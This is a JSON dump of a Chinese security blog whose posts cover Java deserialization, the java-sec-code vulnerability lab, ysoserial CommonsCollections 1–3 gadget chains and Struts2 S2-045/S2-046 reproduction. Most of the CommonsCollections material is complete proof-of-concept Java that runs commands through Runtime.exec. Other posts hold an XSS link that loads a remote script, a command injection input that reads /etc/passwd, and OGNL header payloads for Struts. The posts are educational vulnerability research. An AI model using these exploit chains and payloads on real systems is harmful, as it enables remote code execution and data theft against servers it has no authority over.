代理类描述符，与反序列化漏洞修复相关。其实说法不准确，应该说是针对 resolveProxyClass 和 resolveClass()方法，因为知道是通过上面两个方法获取类名，因此可以通过重写这两个方法设置黑名单抛出异常。 比如 反序列化漏洞触发场景在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景： HTTP请求中的参数，cookies以及Parameters。 RMI协议，被广泛使用的RMI协议完全基于序列化 JMX同样用于处理序列化对象 自定义协议 用来接收与发送原始的java对象 个人觉得比较常见的是1、2 反序列化漏洞挖掘 反序列化触发点 一、常见反序列化操作方法 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject gadget chain 一、 实现 Serializable 或 Externalizable， 主要看 readObject() 和 readExternal() 二、XStream、JSON相关的序列化工具等，不用实现上面提到的两个接口也可以实现类的序列化与反序列化。 常见可利用的第三方库 1234567891011commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9 参考链接 https://govuln.com/ http://www.lmxspace.com/ https://www.cnblogs.com/studyskill/p/9207117.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java Sec Code学习笔记","slug":"Java-Sec-Code学习笔记","date":"2020-04-15T13:11:31.000Z","updated":"2020-04-17T10:39:31.177Z","comments":true,"path":"2020/04/15/Java-Sec-Code学习笔记/","link":"","permalink":"https://glotozz.github.io/2020/04/15/Java-Sec-Code%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 预备知识 SQLI XSS 文件上传漏洞 SSTI JSONP劫持 CommandInject 反序列化漏洞 FastJson漏洞 路径穿越漏洞 GetRequestURI IP伪造 SpEL XStreamRce URL重定向 SSRF XXE 总结 之前主要是分析一些java中影响较大的历史漏洞，大多都是框架层面的漏洞，前两天看到JoyChou师傅github上的项目，是一个java漏洞代码的靶场，包括常见漏洞代码和安全代码，值得细品。 环境搭建https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md 该项目是基于spring框架开发，我搭建的方式选择idea搭建。 预备知识在正式开始学习这个项目之前可以先简单学习下spring框架。 虽然没用过spring框架，但是大致能看懂，先分析几个常规的文件。 Login.java Index.java SQLI漏洞代码 直接将用户传入的username拼接入sql语句 漏洞测试 安全代码 采用预编译的形式可以防止sql注入 XSS漏洞代码 反射型xss 对于用户输入的参数没有过滤直接返回给前端，导致反射性xss，可以通过构造恶意链接诱导用户访问，从而获取cookie等扩大危害。 存储型xss 对于用户输入的参数没有过滤直接保存到cookie中，读取的时候也没有经过处理导致前端解析的时候导致xss 漏洞测试 恶意链接 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;xss&#x2F;reflect?xss&#x3D;%3CsCRiPt%20sRC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;uJSf%3E%3C&#x2F;sCrIpT%3E 测试了一下，能接收到请求，但是读不到cookie，查看cookie发现设置了httponly 安全代码 将一些特殊字符html实体编码防止xss 文件上传漏洞没有提供漏洞代码，但是可以参考上传图片功能的检查举一反三。 安全代码 两个函数 convert()先写入一个临时文件，为之后的内容检查做准备，isImage()判断是否是图片格式 获取一些文件属性 后缀名检查 MIME类型检查（个人认为MIME的意义不大） 图片内容检查 最后上传文件后将临时文件删除。 SSTI漏洞代码 漏洞测试 安全代码 velocity.evaluate()最新版本仍存在ssti，避免使用velocity.evaluate()方法 JSONP劫持用json来传数据，靠jsonp来跨域 漏洞原理 漏洞代码 返回jsonp格式，注意这里的this.callback=_callback，当然这个例子即使param传错也能获取到数据 返回jsonp格式，没有处理referer为空的情况，并且空referer是可以被绕过的 返回Object(比如JSONObject或者JavaBean，但是不支持String)，只要在参数中加入callback=test或cback=test就会自动变成jsonp接口。 CVE-2018-11040: Spring MappingJackson2JsonView， 自动获取jsonp和callback参数使json数据自动转换成jsonp格式数据，支持跨域请求 漏洞测试 两种方式 ajax 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\" /&gt;&lt;script src=\"https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script language=\"JavaScript\"&gt;$(document).ready(function() &#123; $.ajax(&#123; url:'http://192.168.56.1:8080/vuln/emptyReferer', dataType:'jsonp', success:function(data)&#123; alert(data.name) &#125; &#125;);&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; &lt;script&gt; 123456789&lt;html&gt;&lt;script&gt; function test(data)&#123; alert(data.name); &#125;&lt;/script&gt;&lt;script src=http://localhost:8080/jsonp/referer?callback=test&gt;&lt;/script&gt;&lt;/html&gt; 空referer绕过 (为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer) 12345678910&lt;html&gt;&lt;meta name=\"referrer\" content=\"no-referrer\" /&gt;&lt;script&gt; function test(data)&#123; alert(data.name); &#125;&lt;/script&gt;&lt;script src=http://localhost:8080/jsonp/emptyReferer?callback=test&gt;&lt;/script&gt;&lt;/html&gt; 这里meta标签中删除了referer 靶场的有登录认证，因此就不继续测试了 安全代码 referer为空也进行拦截 CommandInject漏洞代码 没有对用户输入进行处理拼接进cmdList，命令执行 和上面的类似 漏洞测试 1host:127.0.0.1;cat &#x2F;etc&#x2F;passwd 安全代码 对传入的参数进行正则匹配，限制了字符集。 我感觉这个正则少了一个\\，应该如下 1^[a-zA-Z0-9_\\&#x2F;\\\\.-]+$ 反序列化漏洞漏洞代码 从cookie读取rememberMe字段对应的值，base64解密后进行反序列化，存在反序列化漏洞 漏洞测试 使用ysoserial生成CC5 安全代码 项目中缓解的实现方法是写一个ObjectInputStream的子类，这个子类要重写resolveClass()，可以配置白名单或者黑名单。 Oracle最近引进serialization filtering来提高反序列化的安全性，它似乎结合了黑名单和白名单两种方式。新的反序列化过滤器被集成在JDK 9之中，这个特性已经被移植到更老的JDK之中了。核心原理是，反序列化过滤基于ObjectInputFilter（ https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html ）接口，这个接口提供一种配置能力 FastJson漏洞漏洞代码 以fastjson1.2.24为例，parseObject()方法调用的时候加上Feature.SupportNonPublicField且payload用户可控 安全代码 升级fastjson，避免使用危险配置参数 路径穿越漏洞漏洞代码 没有对传入的文件路径进行检查 安全代码 先进行url解码，再设置..和/黑名单，防止路径穿越 GetRequestURI漏洞代码 一些开发人员对静态目录会放行，检测是否包含/css/字符串，不包含才校验权限。可以权限绕过 漏洞测试 123http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;%2e%2e&#x2F;uri&#x2F;exclued&#x2F;vulnhttp:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;exclued&#x2F;vulnhttp:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;bypasswaf&#x2F;exclued&#x2F;vuln 安全代码 将获取URI的方法换成request.getServletPath(); 12uri: &#x2F;css&#x2F;..&#x2F;hello serlvetPath: &#x2F;hellouri: &#x2F;css&#x2F;%2e%2e&#x2F;hello serlvetPath: &#x2F;hello IP伪造 用户可以伪造XFF头，因此ip不能从X-Forwarded-For获取 SpEL漏洞代码 使用了SpelExpressionParser()方法，SpEL解析，下面有个相关的漏洞 SpringBoot SpEL表达式注入漏洞 漏洞测试 安全代码 使用SimpleEvaluationContext() XStreamRce漏洞代码 使用XStream来解析xml，版本1.4.10 or &lt;=1.4.6 相关的还有比如s2-052，漏洞在于使用REST插件的XStream组件进行反序列化XML时没有任何过滤，导致攻击者可以构造恶意xml payload导致RCE。 漏洞测试 因此当前项目更新了版本，之后可以单独分析下XStream漏洞 安全代码 更新XStream版本 URL重定向漏洞代码 上面是3种重定向的代码，但是由于没有对重定向的url进行检查，导致url重定向漏洞，跳转到一个攻击者控制的网站，可能导致跳转过去的用户被精心设置的钓鱼页面骗走自己的个人信息 和登录口令 。 漏洞测试 跳转到任意页面 漏洞修复 设置白名单和黑名单校验 SSRF漏洞代码 相对于php，在java中SSRF的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。 漏洞测试 读文件 还可以端口扫描 安全代码 首先限制了http/https协议，使用ssrfHook() 跟进initSocketImpl() 上面是一部分ssrf检查的代码，总体是从黑名单的角度来防止ssrf，现在一些业务也可以限制域名白名单 12345678910111213从URL中获取host，限制为http&#x2F;https协议。只支持http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;，不支持&#x2F;&#x2F;的http协议。host转换为IP * 会将各种进制的ip转为正常ip * 167772161转换为10.0.0.1 * 127.0.0.1.xip.io转换为127.0.0.1使用SubnetUtils库判断ip是否在内网网段 * * @param strIP ip字符串 * @return 如果是内网ip，返回true，否则返回false。判断一个URL的IP是否是内网IP解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。 * url只允许https或者http，并且设置默认连接超时时间。 * 该修复方案会主动请求重定向后的链接。最好用Hook方式获取到所有url后，进行判断 XXE漏洞代码 解析xml的对象没有正确配置导致XXE 安全代码 后面几个也差不多，正确配置可以防止XXE。 总结这个项目看的比较快，主要是一些java可能出现的基础漏洞，不过在学习的过程中找到一些好文章。","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"ysoserial-CommonsCollections系列学习","slug":"ysoserial-CommonsCollections系列学习","date":"2020-04-14T03:06:33.000Z","updated":"2020-04-18T04:34:38.223Z","comments":true,"path":"2020/04/14/ysoserial-CommonsCollections系列学习/","link":"","permalink":"https://glotozz.github.io/2020/04/14/ysoserial-CommonsCollections%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 简单介绍 预备知识 CommonsCollections1 CommonsCollections2 CommonsCollections3 参考链接 之前分析过ysoserial-CommonsCollections5这条链，这里学习下其他的思路 简单介绍 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 一些Java应用程序(Weblogic，Websphere，Jboss，Jenkins，Coldfusion等)的RCE漏洞都是因为Commons-Collections的反序列化造成的。 预备知识动态代理 在不修改类的源码的情况下，通过代理的方式为类的方法提供更多的功能。 123456package java.lang.reflect;public interface InvocationHandler &#123; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable;&#125; demo Do接口 12345package com.company;public interface Do &#123; public String doSome();&#125; People类 12345678package com.company;public class People implements Do&#123; public String doSome() &#123; return \"gqy\"; &#125;&#125; DoHandler类用来处理被代理对象，它必须继承InvocationHandler接口，并实现invoke()方法 123456789101112131415161718192021222324252627282930313233package com.company;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class DoHandler implements InvocationHandler &#123; private Object object; public DoHandler(Object object)&#123; this.object = object; &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; //在真实的对象执行之前我们可以添加自己的操作 System.out.println(\"before invoke。。。\"); //java的反射功能，用来调用obj对象的method方法，传入参数为args Object invoke = method.invoke(proxy, args); return invoke; &#125; public static void main(String[] args) &#123; People people = new People(); //代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法 InvocationHandler handler = new DoHandler(people); /** * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数 * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象 * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法 * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上 */ Do proxy = (Do) Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler); System.out.println(proxy.doSome()); &#125;&#125; 成功打印出before invoke。。，相当于重写了doSome() javassist动态编程 ysoserial中基本上所有的恶意object都是通过动态编程的方式生成的，通过这种方式我们可以直接对已经存在的java文件字节码进行操作，也可以在内存中动态生成Java代码，动态编译执行。 像CC1可以不用，但是像CC2使用javassist会方便很多。 关键函数功能 123456789101112131415161718&#x2F;&#x2F;获取默认类池，只有在这个ClassPool里面已经加载的类，才能使用ClassPool pool &#x3D; ClassPool.getDefault();&#x2F;&#x2F;获取pool中的某个类CtClass cc &#x3D; pool.get(&quot;test.Teacher&quot;);&#x2F;&#x2F;为cc类设置父类cc.setSuperclass(pool.get(&quot;test.People&quot;));&#x2F;&#x2F;将动态生成类的class文件存储到path路径下cc.writeFile(path);&#x2F;&#x2F;获取类的字节码byte[] b&#x3D;cc.toBytecode();&#x2F;&#x2F;创造Point类CtClass cc &#x3D; pool.makeClass(&quot;Point&quot;);&#x2F;&#x2F;为cc类添加成员变量cc.addField(f);&#x2F;&#x2F;为cc类添加方法cc.addMethod(m);&#x2F;&#x2F;为cc类设置类名cc.setName(&quot;Pair&quot;); CommonsCollections1Gadget chain 适用版本： CommonsCollections3.1-3.2.1，jdk1.8以前 主要分析LazyMap.get()之前的，后面的chain不再赘述，可以看之前分析的CC5 \\java7\\jre\\lib\\rt.jar!\\sun\\reflect\\annotation\\AnnotationInvocationHandler.class readObject()方法 没有直接能调用get()的地方，由于实现了InvocationHandler接口，跟进invoke()方法 这里this.memberValues.get(var4);调用了get()方法 前面构造方法中看到memberValues直接可控，反序列化调用readObject()方法，这里可以结合动态代理。 我们可以设置this.memberValues为一个LazyMap的代理类AnnotationInvocationHandler，那么执行到this.memberValues.entrySet().iterator()的时候，因为this.memberValues为代理类，所以转而执行LazyMap代理类AnnotationInvocationHandler的invoke方法 123InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);InvocationHandler invocationHandler = (InvocationHandler)ctor.newInstance(Override.class,Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler)); POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); //将proxy代理放进外层的AnnotationInvocationHandler，从而membervalues.entryset触发动态代理 String clazzName = \"sun.reflect.annotation.AnnotationInvocationHandler\"; Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[0]; ctor.setAccessible(true); //代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法 InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap); //Proxy.newProxyInstance的三个参数 /* 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上 */ InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler)); //序列化 File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //反序列化 FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; CommonsCollections2Gadget chain 适用版本： CommonsCollections4.0， jdk7u21及以前。 CommonsCollections1也是可以在commons-collections-4.0利用成功的， 因为commons-collections-4.0删除了lazyMap的decorate()方法 123Map lazyMap &#x3D; LazyMap.decorate(innerMap, transformerChain);&#x3D;&gt;Map lazyMap &#x3D; LazyMap.lazyMap(innerMap,transformerChain); 而CommonsCollections2无法在commons-collections-3.1-3.2.1中利用，因为 CommonsCollections2的payload中使用的TransformingComparator在3.1-3.2.1版本中还没有实现Serializable接口，无法被反序列化。 可以看到CC2的反序列化漏洞点主要还是InvokerTransformer.transform()，并且用到了 /org/apache/commons/collections4/comparators/TransformingComparator.class中的compare()方法 该方法实现了java.util.Comparator中定义的compare()， 这里找到了PriorityQueue，定义了readObject() 跟进heapify() 调用了comparator.compare()方法，我们可以将comparator置为TransformingComparator 那么再分析InvokerTransformer.transform()，可以反射调用类方法，这里用到了fastjson1.2.24中使用过的com.sun.org.apache.xalan.internal.xsltc.trax.Templates，参考 Java反序列化漏洞-FastJson1.2.24 ， 只要能调用包含恶意字节码的TemplatesImpl对象的利用链中的任意函数(getOutputProperties、newTransformer等等)，就能造成RCE POC ysoserial使用了javassist组件自动生成恶意类的bytecode EvalClass类 123456789101112131415161718192021222324package src.com.company;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class EvalClass extends AbstractTranslet &#123; public EvalClass() throws IOException &#123; Runtime.getRuntime().exec(\"calc.exe\"); &#125; //继承AbstractTranslet需要重写下面两个方法 public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException &#123; &#125;&#125; Poc类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package src.com.company;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import java.io.*;import java.lang.reflect.Field;import java.util.PriorityQueue;import javassist.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class Poc &#123; public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123; //1.封装TemplatesImpl实例 TemplatesImpl tmp = new TemplatesImpl(); //获取默认类池 ClassPool pool = ClassPool.getDefault(); //加入我们的恶意类 pool.insertClassPath(new ClassClassPath(EvalClass.class)); //获取pool中的EvalClass CtClass pay = pool.get(EvalClass.class.getName()); //获取Eval类的字节码 byte[] PayCode = pay.toBytecode(); Class clazz; clazz = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); //为私有属性_bytecodes赋值，即恶意类的字节码 Field tf = clazz.getDeclaredField(\"_bytecodes\"); tf.setAccessible(true); tf.set(tmp,new byte[][]&#123;PayCode&#125;); //为私有属性_name赋值，内容任意 Field name = clazz.getDeclaredField(\"_name\"); name.setAccessible(true); name.set(tmp,\"gqy\"); //2.封装PriorityQueue实例 PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); //实例化一个InvokerTransformer，因为只调用一次，无需使用transformerChain// InvokerTransformer trans = new InvokerTransformer(\"newTransformer\",new Class[0],new Object[0]); InvokerTransformer trans = new InvokerTransformer(\"getOutputProperties\",new Class[0],new Object[0]); //调用该方法一样的效果 //实例化TransformingComparator TransformingComparator com = new TransformingComparator(trans); //设置私有属性comparator Field ComFi = PriorityQueue.class.getDeclaredField(\"comparator\"); ComFi.setAccessible(true); ComFi.set(queue,com); //设置私有属性queue，//将templasImpl实例放入队列，在比较的时候会传入invokertransform的transform函数 Field qu = PriorityQueue.class.getDeclaredField(\"queue\"); qu.setAccessible(true); Object[] objOutput = (Object[])qu.get(queue); objOutput[0] = tmp; objOutput[1] = 1; //3.序列化 File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(queue); out.close(); //4.反序列化obj对象 FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; 分析是一回事，写poc是另一回事。 CommonsCollections3Gadget chain 适用版本：3.1-3.2.1，jdk7u21及以前 入口和CC1相同，不同的是后面找到了InstantiateTransformer类， 因为AnnotationInvocationHandler+LazyMap.get()不存在的key导致key不可控，因此只需要chainedTransformer第一个transfomer为constanttransformer即可，这里用到了类com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 传入一个Templates实例，调用了templates.newTransformer()，正是我们想要的（参考CC2中最后一步） POC 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package com.company;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.*;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;public class Poc &#123; public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, NotFoundException, IOException, CannotCompileException &#123; //1.封装TemplatesImpl实例 TemplatesImpl tmp = new TemplatesImpl(); //获取默认类池 ClassPool pool = ClassPool.getDefault(); //加入我们的恶意类 pool.insertClassPath(new ClassClassPath(EvalClass.class)); //获取pool中的EvalClass CtClass pay = pool.get(EvalClass.class.getName()); //获取Eval类的字节码 byte[] PayCode = pay.toBytecode(); Class clazz; clazz = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); //为私有属性_bytecodes赋值，即恶意类的字节码 Field tf = clazz.getDeclaredField(\"_bytecodes\"); tf.setAccessible(true); tf.set(tmp,new byte[][]&#123;PayCode&#125;); //为私有属性_name赋值，内容任意 Field name = clazz.getDeclaredField(\"_name\"); name.setAccessible(true); name.set(tmp,\"gqy\"); //2.封装chained和lazymap Transformer[] trans = new Transformer[]&#123; //ConstantTransformer会将参数原样返回 new ConstantTransformer(TrAXFilter.class), //传入我们的TemplatesImpl实例，会在构造函数中调用templates.newTransformer() new InstantiateTransformer( new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmp&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(trans); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); //3.将proxy代理放进外层的AnnotationInvocationHandler，从而membervalues.entryset触发动态代理（与commonscollection1相同） String clazzName = \"sun.reflect.annotation.AnnotationInvocationHandler\"; //获取AnnotationInvocationHandler类的构造方法数组 Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[0]; ctor.setAccessible(true); //代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法 InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap); //Proxy.newProxyInstance的三个参数 /* 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上 */ InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler)); //4.序列化 File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //5.反序列化obj对象 FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; 后面还有几条，未完待续 但是通过前面几条可以看到利用的知识主要是动态代理，javassist动态编程，反射等，加上寻找一些类的组合利用。 参考链接 https://www.freebuf.com/articles/web/214096.html https://www.anquanke.com/post/id/200637","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java漏洞学习-S2-046","slug":"Java漏洞学习-S2-046","date":"2020-04-14T01:21:22.000Z","updated":"2020-04-14T06:16:50.030Z","comments":true,"path":"2020/04/14/Java漏洞学习-S2-046/","link":"","permalink":"https://glotozz.github.io/2020/04/14/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-046/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 漏洞原因 环境搭建 漏洞复现 漏洞分析 漏洞修复 st-046建立在st-045的基础之上，如果之前对于st-045的修复方式仅针对Content-Type做策略防护的话，还需要对Content-Disposition也加一下策略。当然最好的方式还是升级到最新版。 漏洞原因有两个 ①Content-Length的长度值超长 这个漏洞需要在strust.xml中加入&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;才能触发。触发漏洞的代码在 JakartaStreamMultiPartRequest类中，processUpload函数处理了content-length长度超长的异常，导致问题触发。 ②Content-Disposition的filename存在空字节 环境搭建和st-045相同 影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 maven搭建 12345678&lt;dependencies&gt; &lt;!-- struts2依赖包 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.3.30&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 漏洞复现1Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;%&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,233*233)&#125;\\0b&quot; 漏洞分析可以从tomcat的报错信息查看调用栈 前面的调用栈比较清楚，看最后的checkName() /org/apache/commons/fileupload/util/Streams.class 在这里由于我们传入了\\0，进入第一个if分支，导致抛出异常，继续跟进 之后会进入st-045中分析过的buildErrorMessage()，具体不再赘述。 漏洞修复 严格过滤Content-Type 、filename里的内容，严禁ognl表达式相关字段。 如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java漏洞学习-S2-045","slug":"Java漏洞学习-S2-045","date":"2020-04-13T08:13:17.000Z","updated":"2020-04-13T14:56:40.055Z","comments":true,"path":"2020/04/13/Java漏洞学习-S2-045/","link":"","permalink":"https://glotozz.github.io/2020/04/13/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-045/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞复现 原理分析 漏洞修复 参考链接 面试的时候问到了st2-045漏洞以及绕过修复后出现的st2-046，分析一下 Struts2默认解析上传文件的Content-Type头，存在问题。在解析错误的情况下，会执行错误信息中的OGNL代码，当Content-Type注入Payload后就可以通过OGNL执行命令。 环境搭建影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 maven搭建 12345678&lt;dependencies&gt; &lt;!-- struts2依赖包 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.3.30&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 漏洞复现验证 1Content-Type: %&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,233*233)&#125;.multipart&#x2F;form-data getshell 